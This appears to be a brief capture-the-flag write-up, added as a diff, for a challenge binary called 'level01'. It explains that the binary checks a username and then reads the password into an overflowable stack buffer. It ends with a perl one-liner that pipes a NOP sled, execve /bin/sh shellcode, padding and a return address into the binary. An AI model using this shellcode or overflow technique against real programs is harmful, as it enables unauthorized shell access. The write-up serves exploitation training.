@@ -1,0 +1,8 @@
+1. The executable firstly wait for an username and if the username is good, wait for a password in STDIN.
+2. We found the string "dat_wil" for username and "admin" for password
+3. We deduct that the binary have the same behavior if the password is "admin" or not but the STDIN is always compared with admin
+4. The main thing here is that the STDIN for the username is stored in a global variable and the password is stored in the stack
+5. So we created a payload that nicely send "dat_wil" first and the exploit after that :
+
+(perl -e 'print "dat_wil" . "\x0a" . "\x90"x10 . "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" . "1"x47 . "\x30\xde\xff\xff"'; cat -) | env -i ./level01
+
